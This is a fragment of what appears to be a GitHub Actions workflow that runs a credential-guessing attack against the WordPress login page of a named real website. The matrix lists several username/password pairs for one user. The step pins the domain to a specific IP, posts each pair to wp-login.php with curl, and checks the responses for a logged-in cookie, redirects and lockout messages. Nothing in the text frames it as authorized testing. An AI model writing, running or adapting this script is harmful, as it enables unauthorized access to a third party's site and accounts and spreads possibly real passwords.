          - { u: 'vaibhav', p: 'o_44h2103e28w' }
          - { u: 'vaibhav', p: 'gendao.o_44h2103e28w' }
          - { u: 'vaibhav', p: 'ferryinfotech' }
          - { u: 'vaibhav', p: 'Admin@554411' }
    steps:
      - name: attempt
        env:
          U: ${{ matrix.u }}
          P: ${{ matrix.p }}
        run: |
          set +e
          I=103.20.214.142
          R="--resolve supportfly.com:443:$I"
          curl -sk -m 15 $R -c /tmp/c "https://supportfly.com/wp-login.php" -o /tmp/l
          code=$(curl -sk -m 15 $R -b /tmp/c -c /tmp/c -o /tmp/b -D /tmp/h -w '%{http_code}' "https://supportfly.com/wp-login.php" --data-urlencode "log=$U" --data-urlencode "pwd=$P" --data-urlencode "wp-submit=Log In" --data-urlencode "redirect_to=https://supportfly.com/wp-admin/" --data-urlencode "testcookie=1")
          loc=$(grep -i '^location:' /tmp/h | tr -d '\r')
          ck=$(grep -ci 'set-cookie: wordpress_logged_in' /tmp/h)
          hint=$(grep -oiE 'Unknown username|password you entered|One moment|Too many|locked|Dashboard' /tmp/b | sort -u | tr '\n' ',')
          echo "RESULT[$U|$P] code=$code logged_cookie=$ck loc=$loc hint=$hint"
